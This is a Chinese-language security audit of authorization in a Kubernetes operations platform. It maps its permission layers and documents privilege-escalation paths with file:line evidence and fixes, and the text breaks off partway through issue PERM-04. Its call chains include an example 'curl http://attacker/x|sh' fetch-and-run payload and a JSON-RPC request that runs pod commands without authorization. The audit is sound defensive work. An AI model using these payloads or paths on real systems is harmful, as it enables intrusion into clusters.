# 13 权限与授权审计（Permission & Authorization Audit）

- 审计对象：`/Users/wolf/Documents/project/autohealops`
- 审计方式：**只读**源码审计（未修改任何代码/配置/依赖，未安装依赖，未连接任何环境，未执行 git 写操作）
- 统计口径（本次实测命令见第 7 节）：
  - api-server 路由总数 **499**（含 3 个 WebSocket），写类路由（POST/PUT/DELETE/PATCH）**285**
  - 角色依赖：`Depends(require_admin)` **124** 处、`Depends(require_operator)` **123** 处、`Depends(require_any_user)` **219** 处
  - 资源级授权：`check_cluster_permission` 在 `app/api/*.py` 共 **42** 处、`check_db_permission` **39** 处；`resources.py` 内 `_deny_cluster` **77** 处（覆盖 79 路由中的 77 个）
  - **66 个路由模块中只有 17 个**使用资源级授权（`grep -rln "check_cluster_permission\|check_db_permission" app/api/*.py`）
  - 审计写入点：`create_audit_record` 全仓 **25** 处，对照 **285** 个写路由
- 结论口径：所有结论带 `文件:行`；无法从源码确认的写「暂时无法确认」

---

## 1. 结论摘要（10 条，带数字）

1. **权限体系是「四层，但只有三层真正落地」**：认证（JWT）→ 角色（admin/operator/viewer/developer）→ 资源授权（cluster+ns / db / host group / project）→ 审核（approval / db_approval / autonomy_gate）。第三层**只覆盖 17/66 个模块**，第四层与第三层**互不引用**（审批人不校验集群归属，见 PERM-07）。
2. **角色层是「后端强校验 + 单点函数」**：`require_role()` 25 行实现全部角色判定（`middleware/permission.py:9-25`），无任何资源概念；角色只有 4 个，且 `admin` 在 `check_cluster_permission` 里直接 `return True` 短路（`services/user_permission_service.py:44-45`）。
3. **资源层是「后加的能力，靠人工逐接口接入」**：`check_cluster_permission` / `check_db_permission` 存在且语义正确（直接授权 ∪ 项目授权取最高，权重 read=1/operate=2/manage=manager=3），但**没有统一中间件/装饰器**，全靠 handler 里手写 `if denied := await _deny_cluster(...)`。
4. **最严重的一条：MCP 接口绕过工具权限闸门**。`POST /mcp` 的 `tools/call` 直接 `await td["handler"](args, context)`（`api/mcp.py:106-108`），既不走 `execute_tool()` 的 `allow_operate` 闸门，也不校验 `cluster_id` 归属 → **任何登录用户（含 viewer）可对任意集群的任意 Pod 执行容器内命令**（PERM-01，P0）。
5. **第二条 P0：`custom-tasks` 的 `script` 类型 = 任意集群任意 shell**。`POST /api/v1/custom-tasks`（`require_operator`）接受任意 `cluster_id` + `script_content`，调度器把脚本交给 executor 以 `/bin/sh -c` 起 Job（`services/scheduler_service.py:82-83` → `k8s-executor/internal/script/*.go:53`），**既不校验集群授权也不走审批**（PERM-02）。
6. **第三个跨集群执行缺口：`/api/v1/batch`**。`create_batch`/`execute_batch` 均为 `require_operator`，`cluster_ids` 完全由请求体决定（`api/batch.py:14-31`），无一条授权判断（PERM-03）。
7. **命名空间越权真实存在**：`apply_workload` / `apply_object_yaml` 用**请求体里的 namespace** 做鉴权，但 executor 在解析 YAML 后**用 YAML 里的 namespace 覆盖**（`internal/executor/pod_list_events.go:467-469`）→ 有 `dev` 命名空间 operate 的人可写入 `prod`（PERM-04，P1）。
8. **只读类资源接口没有租户隔离**：告警列表/详情/处置、审批列表/详情、执行日志/回滚、统计，全部只判角色不判集群归属（`alerts.py:60`、`approvals.py:31,157`、`executions.py:38,66`）→ viewer 能看到全平台告警与诊断详情（PERM-05/PERM-06）。
9. **数据库审核可自批**：`db_approvals` 的 `requested_by` 与 `approved_by` 之间**没有任何互斥校验**，项目管理员提交后自己审批即通过（`api/db_approvals.py:112-268`、`services/db_approval_service.py:297-315`）；同时 `create_db_approval` 不校验对目标库的 `check_db_permission`（PERM-07）。
10. **操作审计严重不完整**：285 个写路由只有 25 个审计点，且集中在主机终端/审批/节点类操作；`resources.py` 79 个路由里删除/扩缩容/回滚/改 env/改挂载**绝大多数不写 audit**（PERM-10）。

---

## 2. 权限体系全貌：四层在哪里落地

```
[L1 认证]  middleware/auth.py: get_current_user (18-48)  ← Bearer JWT + Redis 黑名单
              ↓  get_current_active_user (51-54) 检查 is_active
[L2 角色]  middleware/permission.py: require_role / require_admin / require_operator / require_any_user (9-25)
              ↓  4 个角色：admin, operator, viewer, developer
[L3 资源授权] services/user_permission_service.py
              ├─ get_visible_cluster_ids (24-49)     集群可见集合（只有 3 处调用）
              ├─ check_cluster_permission (52-86)    cluster+namespace+read/operate
              ├─ check_db_permission (89-118)        db_connection+read/manage
              ├─ resolve_project_managers (121-140)  项目 manager（双人审批第二人来源）
              └─ services/host_group_service.py: host_access (52-58)  主机群组角色
              ↓  模型：user_cluster_permissions / user_db_connections / user_project_permissions
              ↓        projects / project_cluster_ns / project_db_connections
[L4 审核]   services/approval_service.py   （修复方案：auto / approve / manual）
              services/autonomy_gate.py     （风险×置信度×用户感知 → auto/approve/manual）
              services/db_approval_service.py（DB：query/write/ddl/export 四类开关）
              services/approval_service._check_approver_permission (197-225)
```

### 2.1 逐层落点与关键代码

| 层 | 落地函数 | 证据 | 说明 / 缺口 |
|---|---|---|---|
| 认证 | `get_current_user` | `app/middleware/auth.py:18-48` | JWT 只校验签名+过期+黑名单；**Redis 不可用时黑名单校验降级放行**（`auth.py:26-35`） |
| 认证（WS/SSE） | `_resolve_user(token)` | `api/terminal.py:22-32`、`api/workload_logs.py:88-96`、`api/screens.py:31-51` | token 走 query param，**不进黑名单校验分支的日志**但会进 nginx access log（见 14 报告 SEC-04） |
| 角色 | `require_role(*roles)` | `app/middleware/permission.py:9-25` | 4 角色硬编码，无权限点/无 scope，`_allowed_roles` 仅用于测试自省 |
| 资源-cluster | `check_cluster_permission` | `services/user_permission_service.py:52-86` | 直接授权 ∪ 项目授权；`namespace=""` 表示「该集群下任意一条授权即可」；admin 短路 |
| 资源-db | `check_db_permission` | `services/user_permission_service.py:89-118` | read(1)/manage(3)；项目 manager(3) 可覆盖 |
| 资源-host | `host_access` | `services/host_group_service.py:52-58` | **未分组主机非 admin 一律不可见**（比 cluster/db 更严） |
| 资源-project | `UserProjectPermission` | `models/project.py:55-70` | 成员增删只有 admin（`api/projects.py:246,287,326`），无自助加入路径 |
| 审核-修复 | `approve()` + `_check_approver_permission` | `services/approval_service.py:415-475,197-225` | approvers 为空时**跳过身份校验**（`197-211`） |
| 审核-自主处置 | `decide()` | `services/autonomy_gate.py:110-225` | 按 risk×confidence×环境 输出 auto/approve/manual |
| 审核-DB | `can_approve_db` | `services/db_approval_service.py:297-315` | admin 或「该项目 manager」；**不排除申请人本人** |

### 2.2 关键结论：三层之间的「断链」

- **L3 不参与 L2 判定**：`require_operator` 通过即代表「可操作」，资源归属要靠 handler 自己再查一次。于是「漏写一行 `_deny_cluster`」= 完全失去租户隔离（见 PERM-01/02/03/05）。
- **L4 不引用 L3**：`approval_service` / `db_approval_service` 里**没有任何** `check_cluster_permission` 调用；审批人只按「流程节点/项目 manager」选，不看「他对目标集群有没有权限」→ 审批权与操作权不相关（PERM-08）。
- **L3 的可见性函数几乎没人用**：`get_visible_cluster_ids` 全仓只有 3 处调用（`clusters.py:753`、`ticket_service.py:229`、`trace_service.py:795,913`），告警/统计/执行/审批四个模块都没用。

---

## 3. 后端是否逐接口校验：15 个高风险接口逐个核

判定列含义：**角色**=路由依赖；**资源**=是否校验 cluster/ns/db 归属；**审核**=是否要求审批；**审计**=是否落 audit。

| # | 接口（路由） | 文件:行 | 角色 | 资源归属校验 | 审核 | 审计 | 结论 |
|---|---|---|---|---|---|---|---|
| 1 | `DELETE /api/v1/clusters/{id}` 删除集群 | `clusters.py:885-925` | admin | 不适用（admin 全权） | 否 | 否 | ✅ 合理 |
| 2 | `POST /api/v1/resources/clusters/{cid}/namespaces/{ns}/pods/{pod}/exec` 容器执行 | `resources.py:1150-1181` | operator | ✅ `_deny_cluster(...,"operate")` (1153) | 否（设计如此） | ❌ | ⚠️ 有归属无审计 |
| 3 | `POST /api/v1/db-connections/{id}/exec` 写 SQL | `db_connections.py:1312-1348` | **admin** | 不适用 | ✅ `_check_approval(classify_sql)` (1334) + `confirm` (1324) | ✅ `_audit_sql` (1345) | ✅ 三层齐全 |
| 4 | `WS /api/v1/ws/hosts/{id}/terminal` 主机终端 | `host_terminal.py:139-152` | JWT(query) | ✅ `host_access(user,host,"operate")` (149) | 否 | ✅ 命令级审计 (109-122,253-268) | ✅ |
| 5 | `POST /api/v1/approvals/{id}/decide` 审批 | `approvals.py:176-193` | operator | ❌ 无集群归属 | ✅ `_check_approver_permission` (432) | ✅ (approve 内 458-462) | ⚠️ 审批人有效性见 PERM-12 |
| 6 | `POST /api/v1/agent/sessions` 建诊断会话 | `agent.py:120-215` | any_user | ✅ `check_cluster_permission(user,cid,ns)` 但**只要求 read** (133) | 否 | ❌ | ⚠️ read→operate 提权（PERM-09） |
| 7 | `POST /mcp` 的 `tools/call` | `mcp.py:83-114` | any_user | ❌ **零校验**，`cluster_id` 来自请求体 (95) | ❌ | ❌ | 🔴 **P0**（PERM-01） |
| 8 | `GET /api/v1/clusters/{cid}/service-accounts` | `service_accounts.py:26-31` | any_user | ✅ `_deny_cluster` (30) | 否 | ❌ | ✅（读） |
| 9 | `POST /api/v1/external/tickets` 外部建单 | `external_access.py:65-75` | 外部 token (`X-External-Token`) | 不适用（token 即平台级身份） | 否 | ❌ | ⚠️ 单 token = 全量可见（`external_access.py:56` 伪造 admin） |
| 10 | `POST /api/v1/resources/clusters/{cid}/workloads/batch` 批量 | `resources.py:1024-1122` | operator | ✅ 逐 ns 鉴权 (1068-1074) | delete 需 `confirm` | ✅ `_audit_node_change` (1116) | ✅ 标杆实现 |
| 11 | `GET /api/v1/executions/{plan_id}` 执行日志 | `executions.py:37-64` | any_user | ❌ | 否 | ❌ | 🔴 任意人读任意输出（PERM-05） |
| 12 | `POST /api/v1/executions/{plan_id}/rollback` 回滚 | `executions.py:66-113` | operator | ❌ 只查 plan 存在 (73-80) | ❌ | ✅ (101-108) | 🔴 任意 operator 回滚任意集群（PERM-05） |
| 13 | `POST /api/v1/db-approvals` 建审核单 | `db_approvals.py:112-168` | operator | ❌ 无 `check_db_permission` (152-155 只查存在) | 进入审批流 | ❌ | ⚠️（PERM-07） |
| 14 | `POST /api/v1/custom-tasks` 自定义任务 | `custom_tasks.py:28-39` | operator | ❌ `cluster_id` 任意 | ❌ | ❌ | 🔴 **P0**（PERM-02） |
| 15 | `POST /api/v1/batch` + `/{id}/execute` | `batch.py:14-31` | operator | ❌ `cluster_ids` 任意 | ❌ | ❌ | 🔴 P1（PERM-03） |

**统计结论**：15 个里 **6 个完全没有资源归属校验**（#7 #11 #12 #13 #14 #15），**2 个只校验到集群级/read 级而实际执行写操作**（#6 #4 之外见 PERM-04），**3 个完全没有审计**。

### 3.1 `resources.py` 是唯一「逐接口校验」做得好的模块（值得作为范式）

- 79 个路由中 77 个有 `_deny_cluster` 守卫（`resources.py:31-37` 定义，85 行起逐路由调用）；
- 写操作全部 `required="operate"`（脚本核验：无一条 POST/PUT/DELETE 使用 read 级守卫）；
- 批量操作额外做**逐命名空间**鉴权（`1068-1074`），是本仓唯一「批量也不放过 ns」的实现；
- 未覆盖的 2 个路由是 `/registry/tags`、`/registry/parse`（`2162`、`2173`），只查镜像仓库元数据，无集群数据，可接受。

---

## 4. 越权路径：改 `cluster_id / namespace / project_id / resource_id` 能拿到什么

### 4.1 可直接越权的点（按可利用性排序）

| # | 越权方式 | 位置 | 能做什么 | 等级 |
|---|---|---|---|---|
| A | `POST /mcp` 传任意 `cluster_id/namespace/pod_name` | `mcp.py:83-114` | 任意集群任意 Pod 执行命令（`exec_in_pod` 是 `permission: operate` 但被绕过） | P0 |
| B | `POST /custom-tasks` 传任意 `cluster_id` + `script_content` | `custom_tasks.py:28-39` → `scheduler_service.py:82-83` | 任意集群内 `/bin/sh -c` 任意脚本 | P0 |
| C | `POST /batch` 传任意 `cluster_ids` | `batch.py:14-31` | 把一份修复计划打到任意集群集合 | P1 |
| D | `POST /workloads/apply` / `PUT /objects/{kind}/yaml` | `resources.py:1002-1021`、`744-761` | **鉴权用 body/YAML 粗解析的 ns，执行用 YAML 内 ns** → 跨 ns 写 | P1 |
| E | `POST /executions/{plan_id}/rollback` 传任意 plan_id | `executions.py:66-113` | 回滚任意集群的修复计划 | P1 |
| F | `POST /custom-tasks/{id}/run-now`、`/toggle` | `custom_tasks.py:68-86` | 触发他人建的任意集群任务 | P1（与 B 同源） |
| G | `GET /executions/{plan_id}` | `executions.py:37-64` | 读任意计划每步命令与输出（可能含凭据/连接串） | P2 |
| H | `GET /approvals`、`GET /approvals/{id}` | `approvals.py:31,157` | 读全平台审批单（含 plan 摘要、告警详情） | P2 |
| I | `GET /alerts`、`GET /alerts/{id}`、`/alerts/{id}/describe` | `alerts.py:60,225,640` | 读全平台告警 + 现场 describe 输出 | P2 |
| J | `POST /alerts/{id}/resolve`、`/assign`、`/ack`、`/batch-resolve` | `alerts.py:240,308,468,485` | 处置任意集群告警 | P2 |
| K | `POST /agent/proactive/scan` 传任意 `cluster_id` | `agent.py:505-524` | 对任意集群跑巡检并产生 AI 调用（成本+信息） | P2 |
| L | `GET /db-connections/{id}/test` | `db_connections.py:1613-1622` | 无 db 授权也可让平台连库（凭据滥用/内网探测） | P2 |

### 4.2 「只查存在、不查归属」代码清单（可直接对照 review）

```python
# api/executions.py:73-80  —— 只判断 plan 存在 + 状态可回滚，不看 plan 属于哪个集群/项目
plan = await session.get(RepairPlan, plan_id)
if not plan: return {...404}
if plan.status not in _ROLLBACKABLE_STATUS: return {...400}
alert = await session.get(Alert, plan.alert_id)   # 直接拿 cluster_id 去打 executor
cluster_id = alert.cluster_id
```

```python
# api/db_approvals.py:152-155  —— 只查连接存在，未 `check_db_permission(user, conn_id)`
c = await session.get(DBConnection, conn_id)
if not c: return {...404}
req = await db_approval_service.create_request(session, conn_id=conn_id, ...)
```

```python
# api/custom_tasks.py:31-35  —— 任意字段直接落库，含 cluster_id / script_content
t = CustomTask(**{k: v for k, v in payload.items() if k in (
    "cluster_id", "name", "task_type", ..., "script_content", "parameters")})
```

```python
# api/batch.py:15-22  —— cluster_ids 原样进 service
bid = await batch_service.create_batch_operation(..., payload.get("cluster_ids", []), ...)
```

### 4.3 权限函数本身的语义陷阱（不是漏洞，但会导致误判）

- `check_cluster_permission(user, cid, namespace="", "read")`：**namespace 为空 = 只要该集群下有任意一条授权就通过**（`user_permission_service.py:66-73`）。所有「集群级」接口（`overview`、`nodes`、`misc-resources` 无 ns 参数时）因此对「只有 1 个 ns 权限」的用户开放，返回的是**全命名空间聚合数据**。属于设计取舍，但 `misc-resources` 会连带返回其他 ns 的 ConfigMap/Secret 键名。
- `_PERM_WEIGHT` 用 `.get(required, 1)` 兜底（`user_permission_service.py:57`）：传入不存在的 required（如 `zombie.py:20` 的 `"view"`）等价于 read，不会报错也不会收紧。

---

## 5. 六个专项问题

### 5.1 Agent 能否执行未授权项目的任务？

**可以（间接）。** 任务下发链路本身不携带用户上下文：

| 环节 | 证据 | 结论 |
|---|---|---|
| 平台→隧道 | `clients/executor_client.py` 各方法只传 `cluster_id` + 业务参数 + `trace_id`，**无 user_id / project_id** | 执行身份 = 平台自身（kubeconfig 或 agent 的 ClusterRole） |
| 隧道→agent | `agent_gateway.call(cluster_id, method, payload)`（`agent_gateway.py:135-157`） | 只按 `cluster_id` 找连接 |
| agent 注册 | `sha256(token) == cluster.agent_token_hash`（`agent_gateway.py:44-53`），通过即 `agent_status=connected` | **agent 只按 token 认集群**，不认人；一个 token 一旦泄露=该集群全部 RPC |
| agent 执行 | `internal/agentbridge/bridge.go` 在进程内起真实 `ExecutorService`（loopback + raw codec），30+ RPC 全开 | agent 侧无二次鉴权 |

→ 所以「能否执行未授权项目的任务」**完全取决于 api-server 侧的 L3 校验**。而 L3 在 MCP / custom-tasks / batch 三条路径上缺失（第 4 节 A/B/C），因此答案是：**能**。

补充：`agent_last_seen_at` 只在注册时写一次（`agent_gateway.py:51`），不能作为心跳；在线判定靠 `_agents` 内存表（`agent_gateway.py:106-110`），多副本时非本副本的集群一律判「不在线」。

### 5.2 AI 工具调用是否经过权限校验？用的谁的身份？

**部分经过，但身份是「平台」而不是「用户」。**

- 唯一闸门是 `tool_registry.execute_tool()` 的：`if tool["permission"] != "readonly" and not context.get("allow_operate")` → 拒绝（`tool_registry.py:1815-1823`）。
- `context` 里的 `user_id` 在 `tool_registry.py` **一次都没被使用**（`grep user_id tool_registry.py` 只命中注释第 25 行）；所有 handler 直接拿全局 `executor_client` 打集群（例：`_h_exec_in_pod` 在 `tool_registry.py:108-113`）。
- 会话入口把 `allow_operate` 硬编码为 `True`，前置只校验「工具名 ∈ {exec_in_pod}」白名单（`services/agent_service.py:141-160`）。
- 因此：**AI 的执行身份 = 平台服务账号**（kubeconfig / agent ClusterRole，权限为 `*/*`，见 ARCH-13）。AI 能不能碰某个资源，取决于会话建立时那次 `check_cluster_permission`（`agent.py:133`，**只要求 read**）。

→ 「能不能让 AI 操作未授权资源」：**在会话内不能换集群**（`context` 用 `session.cluster_id`，不受 LLM 控制，这点做对了）；**但 read 授权的用户可以借 AI 做 operate 的事**（容器内执行命令），见 PERM-09。

### 5.3 数据库审核能否绕过？

| 入口 | 是否过审核 | 证据 |
|---|---|---|
| `POST /db-connections/{id}/exec`（admin） | ✅ `_check_approval(conn_id, classify_sql(sql))` | `db_connections.py:1332-1336` |
| `POST /{id}/query`（只读） | ✅ 走 `need_query` 开关 | `db_connections.py:367-369` |
| `POST /{id}/table-alter`（DDL） | ✅ 走 `need_ddl` | `db_connections.py:747-749` |
| `POST /{id}/export` | ✅ 走 `need_export` | `db_connections.py:1961` 附近 |
| `POST /{id}/import`、`/import-sql`、`/import-chunk` | ⚠️ **未见 `_check_approval`**（`grep _check_approval` 仅 3 处：424/1961/1333 对应） | 需业务确认是否走 `need_write` |
| `POST /db-approvals/{id}/approve` | ✅ 但**可自批**（见下） | `db_approvals.py:270-296` |
| 定时执行 `run_due_scheduled` | ✅ 只执行 `status=approved` | `db_approval_service.py:259-281`（`main.py` 每 30s） |
| 批量诊断 `db_diagnose_batch` | ✅ 走 `check_db_permission` | `services/db_diagnose_batch_service.py:65` |
| agent RPC `QueryDatabaseByKey` / `ImportSqlRaw` / `DropDatabase` | ❌ **无审核**：`_run_sql` 的 agent 分支直接透传（`db_connections.py:430-446`） | 谁来调就是谁的责任；`agent_gateway`/9096 无鉴权 → 见 SEC-02 |

**自批路径（P1）**：
```python
# services/db_approval_service.py:109-127  create_request 只记 requested_by
requested_by=requested_by or ""
# api/db_approvals.py:281-290  approve 只判 can_approve_db（admin 或项目 manager）
if not await db_approval_service.can_approve_db(user, req.conn_id): return 403
req.approved_by = username
```
→ 项目 manager 提交 → 自己点通过 → `execute_mode=immediate` 当场执行（`db_approvals.py:296-297`）。**没有 `requested_by != approved_by` 校验**，也没有「双人」概念。

### 5.4 是否存在直接调 Executor 绕过审核的路径？

**存在多条。**

| 路径 | 是否审批 | 证据 |
|---|---|---|
| `resources.py` 的删除/扩缩容/重启/apply（77 个守卫点） | ❌ 只要 operate | `1137`(delete workload)、`1269`(scale)、`1378`(rollout)、`912`(apply objects)、`769`(delete object) |
| `resource_governance` 的 ns-limit 删除 | ❌ | `resource_governance.py:136,151,160-161` |
| `resource_governance_ctl` 的自动扩缩 | ❌ | `resource_governance_ctl.py:259` |
| `custom_tasks` script/restart/scale | ❌ | `scheduler_service.py:69-83` |
| `batch_service.execute_batch` → `execute_plan` | ❌ | `services/batch_service.py:42-100` |
| `MCP tools/call` | ❌ | `mcp.py:106-108` |
| `service_accounts` | 只读 | — |
| `external_access` | 只建工单，不执行 | `external_access.py:65-75` |
| **只有**告警自动处置与修复计划走审批 | ✅ | `alert_auto_service` → `autonomy_gate` → `create_approval` |

**结论**：审核（L4）只覆盖「AI 生成的修复计划」这一条主干；**人工直接操作路径全部无审批**。这在产品口径上可能是「人工操作自负」，但与「有审核体系」的表述不一致——同一份删除动作，走 AI 要审批、走人点按钮不用审批。

### 5.5 删除权限：谁能删什么

| 对象 | 接口 | 依赖 | 实际门槛 | 证据 |
|---|---|---|---|---|
| 集群 | `DELETE /clusters/{id}` | require_admin | admin | `clusters.py:885-886` |
| 主机 | `DELETE /hosts/{id}` | require_any_user | 主机组 manage（非 admin 未分组主机不可见） | `hosts.py:302-313` |
| 工单 | `DELETE /tickets/{id}` | require_admin | admin | `tickets.py:127-128` |
| 告警 | 无删除路由 | — | — | `grep "@router.delete" alerts.py` 无命中 |
| 诊断会话 | `DELETE /agent/sessions/{id}` | require_any_user | 本人或 admin | `agent.py:606-618` |
| 诊断任务 | `DELETE /diagnostic-tasks/{id}` | require_any_user | 创建者或 admin | `diagnostic.py:69-78` |
| 自定义定时任务 | `DELETE /custom-tasks/{id}` | require_admin | admin | `custom_tasks.py:57-58` |
| K8s 工作负载/对象 | `DELETE /resources/...` | require_operator | 集群+ns operate | `resources.py:1137,769,1364` |
| 静默/抑制 | `DELETE /alert-silences/...` | require_operator | **无归属校验** | `alert_silences.py:114,291` |
| 订阅 | `DELETE /subscriptions/{id}` | require_any_user | 本人（`s.user_id == user.id`） | `permissions.py:155-161` |

→ 普通用户（viewer）**不能**删集群/主机/工单/会话（会话仅本人）。operator **可以**删任意集群（有 operate 授权的那些）内的工作负载，且**没有审批、多数没有审计**。

### 5.6 权限与审核是否分离？自批可能性

| 场景 | 权限判定 | 审核人判定 | 自批可能 |
|---|---|---|---|
| 修复计划审批 | operator 触发 | `flow_nodes` 展开：duty 值班人 / group_all(含 admin) / user / manager（`approval_service.py:79-137`） | **可能**：`approvers` 为空时回退 `[current_user.username]`（`135-136`），而 `_check_approver_permission` 在 `approvers` 为空时**直接放行**（`207-211`） |
| 双人审批（高风险） | — | 项目 manager + admin 各一票（`_expand_dual_approvers:140-172`） | 若调用方本身是该项目 manager 且是提交者 → **可自批一票**；另一票需 admin |
| DB 审核单 | operator 建单 | admin 或该项目 manager（`can_approve_db:297-315`） | **可**：manager 自建自批（见 5.3） |
| 自主处置 auto | — | `autonomy_gate` 按 risk/confidence | 不涉及人 |

→ **权限与审核在数据模型上是分离的（两套表），在代码上没有交叉校验。** 「谁有权限」与「谁能批」之间没有任何约束，唯一防线是流程配置里别把同一人放进两个角色。

### 5.7 操作审计完整性

- 25 个审计点分布：`host_terminal.py` 6、`approval_service.py` 4、`resources.py` 3（含 `_audit_node_change` 复用 5 处调用）、`hosts.py` 2、`host_groups.py` 2、`host_credentials.py` 2、`db_connections.py` 2、`executions.py` 1、`alerts.py` 1、`alert_auto_service.py` 1、`sql_task_service.py` 1。
- **零审计的高危写模块**：`clusters.py`（建/改/删集群、换 kubeconfig、签发 agent 证书）、`permissions.py`（授权授予/回收）、`projects.py`（项目成员变更）、`custom_tasks.py`、`batch.py`、`mcp.py`、`external_access.py`、`terminal.py`（容器 exec 无审计）、`db_approvals.py`（建单/审批/驳回无 audit，只有 execution 结果落 summary）。
- 已有审计的实现质量尚可：SHA256 前序哈希链（`services/audit_service.py:31-33`）+ `verify-chain` 仅 admin（`api/audit.py`）。

---

## 6. 问题清单

```
问题编号：PERM-01
问题名称：MCP tools/call 绕过工具权限闸门与集群归属校验，可对任意集群任意 Pod 执行命令
问题等级：P0
所属模块：MCP 接口 / AI 工具
问题描述：
  POST /mcp 的 JSON-RPC `tools/call` 分支在取到工具定义后，直接调用 handler：
      r = await td["handler"](args, context)      # api/mcp.py:106-108
  这条路径同时绕过三层约束：
   1) 不走 tool_registry.execute_tool()，因此 `permission != readonly and not
      context["allow_operate"]` 的写权限闸门完全失效（tool_registry.py:1815-1823）；
   2) context.cluster_id / namespace / pod_name 全部来自请求体 arguments（mcp.py:94-100），
      没有任何 check_cluster_permission / check_db_permission 调用；
   3) 无审计（mcp.py 内无 create_audit_record）。
  exec_in_pod 在注册表里被标为 permission="operate"（tool_registry.py:1309），
  但其 handler 只做 executor_client.exec_in_pod 透传（tool_registry.py:108-113）。
代码位置：
  api-server/app/api/mcp.py:83-114（tools/call 分支，关键 106-108、94-100）
  api-server/app/services/tool_registry.py:1299-1312（exec_in_pod 定义）、1815-1823（被绕过的闸门）
涉及函数或类：mcp_endpoint、TOOL_REGISTRY[name]["handler"]、_h_exec_in_pod
调用链：
  任意登录用户 → POST /mcp {"method":"tools/call","params":{"name":"exec_in_pod",
  "arguments":{"cluster_id":<任意>,"namespace":<任意>,"pod_name":<任意>,"command":"id"}}}
  → _h_exec_in_pod → executor_client.exec_in_pod → gRPC/隧道 → 容器内执行
根本原因：MCP 协议层为了「保持简单」直接调 handler，没有复用统一执行门面 execute_tool。
可能影响：
  - viewer 角色即可在任意纳管集群的任意 Pod 内执行命令（容器内提权、读挂载的 Secret、
    横向到集群 API 的 SA token），等效于拿到被管集群的 credentials；
  - 平台「资源级授权」被完全旁路，多租户隔离失效；
  - 无任何审计留痕。
  注：/mcp 前缀不在 nginx(/api/v1) 与 Ingress 的转发范围内，外部入口默认不可达；
  但 api-server Pod 未设 NetworkPolicy（k8s/networkpolicy.yaml 只覆盖 executor 与 ai-service），
  集群内任意 Pod 均可访问 http://api-server:8080/mcp。
修改建议：
  1) mcp.py 改为 `await tool_registry.execute_tool(name, arguments, context)`，
     并在 context 里带上 user 对象/角色；
  2) 在 execute_tool 内增加资源校验：`await check_cluster_permission(user, cluster_id, namespace, "operate")`；
  3) MCP 的写类工具默认禁用（只暴露 readonly），需显式开关；
  4) 给 api-server 也加 NetworkPolicy。
验证方法：
  用 viewer 账号 POST /mcp 调 exec_in_pod（cluster_id 选一个该账号无授权的集群），
  修复前应返回命令输出，修复后应 403。
是否需要立即处理：是
```

```
问题编号：PERM-02
问题名称：custom-tasks 的 script 类型可在任意集群执行任意 shell 脚本（无授权校验、无审批）
问题等级：P0
所属模块：定时任务 / 执行层
问题描述：
  POST /api/v1/custom-tasks 仅要求 `require_operator`，然后把 payload 中
  cluster_id / task_type / script_content / parameters 原样落库
  （api/custom_tasks.py:28-39）。调度器执行时：
      elif task.task_type == "script":
          r = await executor_client.acall(executor_client.run_script,
                                         task.cluster_id, task.script_content, ...)
  （services/scheduler_service.py:82-83），executor 侧以
      Command: []string{"/bin/sh", "-c", scriptContent}
  起一个 Job（k8s-executor/internal/script/runner.go:53）。
  全链路没有 check_cluster_permission、没有 command_guard 校验、没有审批、没有审计。
  同类入口还有 `POST /{id}/run-now`、`/{id}/toggle`（custom_tasks.py:68-86）。
代码位置：
  api-server/app/api/custom_tasks.py:28-39、68-86
  api-server/app/services/scheduler_service.py:69-83
  k8s-executor/internal/script/runner.go:32-60（尤其 53 行）
涉及函数或类：create_task、run_now、scheduler_service._run_task、script.Runner.RunScript
调用链：
  operator → POST /api/v1/custom-tasks {cluster_id:任意, task_type:"script",
  script_content:"curl http://attacker/x|sh"} → 落库 + register_task
  → cron 到点（或 run-now 立即）→ executor_client.run_script → gRPC RunScript
  → executor 创建 Job 执行 /bin/sh -c
根本原因：
  1) 「自定义任务」被设计为运维便利能力，未纳入资源级授权模型；
  2) 任务模型里 cluster_id 是裸整数，没有与 UserClusterPermission 关联。
可能影响：
  - operator（非 admin）可在任意纳管集群以平台身份跑任意代码 → 等效集群权限提升；
  - 可用 run-now 立即执行、可设 cron 长期驻留，且不产生任何审计记录；
  - script_content 无长度/内容限制。
修改建议：
  1) 创建与执行前都校验 `check_cluster_permission(user, cluster_id, "operate")`；
  2) script 类型默认关闭，需 admin 开关 + 双人审批（复用 approval_service）；
  3) script_content 过 command_guard 与长度限制，执行结果落 audit；
  4) 任务表加 created_by，执行时用创建者身份复检（防止授权被回收后仍生效）。
验证方法：
  用只被授权 dev 命名空间的 operator 建一个 cluster_id=生产集群 的 script 任务并 run-now，
  修复前应成功创建 Job，修复后应 403。
是否需要立即处理：是
```

```
问题编号：PERM-03
问题名称：batch 批量执行接受任意 cluster_ids，可把修复计划打到无授权集群
问题等级：P1
所属模块：批量执行
问题描述：
  POST /api/v1/batch 与 /{batch_id}/execute 均为 require_operator，
  cluster_ids 完全来自请求体，未与用户可见集群求交集：
      bid = await batch_service.create_batch_operation(name, payload.get("cluster_ids", []), ...)
  （api/batch.py:14-19）。执行时 batch_service.execute_batch 逐集群下发
  execute_plan（services/batch_service.py:42-100）。
代码位置：
  api-server/app/api/batch.py:14-31
  api-server/app/services/batch_service.py:42-100
涉及函数或类：create_batch、execute_batch、batch_service.execute_batch
调用链：
  operator → POST /batch {cluster_ids:[<无授权集群>], plan_id:<任意计划>} → /execute
  → 逐集群 execute_plan → 变更真实资源
根本原因：批量能力按「集群列表」建模，未做「可用集群 = 用户可见 ∩ 计划适用」的交集。
可能影响：跨集群变更；虽然只能执行已存在的 plan（命令内容不可自定义），但作用域可控性丧失。
修改建议：
  1) cluster_ids 与 get_visible_cluster_ids 求交集，越界直接 400/403 并列出被拒集群；
  2) execute 前再复检一次（防止授权变更后仍可执行）；
  3) batch 执行结果写 audit（当前无）。
验证方法：operator 传一个无授权 cluster_id，期望 403；当前返回 200 并创建 batch。
是否需要立即处理：是
```

```
问题编号：PERM-04
问题名称：apply_workload / apply_object_yaml 鉴权用请求体 namespace、执行用 YAML namespace，可跨命名空间写入
问题等级：P1
所属模块：K8s 资源写操作
问题描述：
  POST /clusters/{cid}/workloads/apply 用 `payload["namespace"]` 做权限判断：
      namespace = (payload.get("namespace") or "").strip()
      if denied := await _deny_cluster(user, cluster_id, namespace, required="operate"):
  （resources.py:1008-1016），随后把整份 YAML 交给 executor。
  executor 侧在解析 YAML 后**用 YAML 里的 namespace 覆盖入参**：
      if ns := obj.GetNamespace(); ns != "" { namespace = ns }
  （k8s-executor/internal/executor/pod_list_events.go:467-469），随后
      ri.Namespace(namespace).Apply(...)
  → 鉴权对象与实际写入对象可以不一致。
  PUT /objects/{kind}/yaml 更粗糙：用逐行扫描 `namespace:` 文本猜命名空间
  （resources.py:752-759），YAML 里 data 值中出现 `namespace:` 行就会取错，
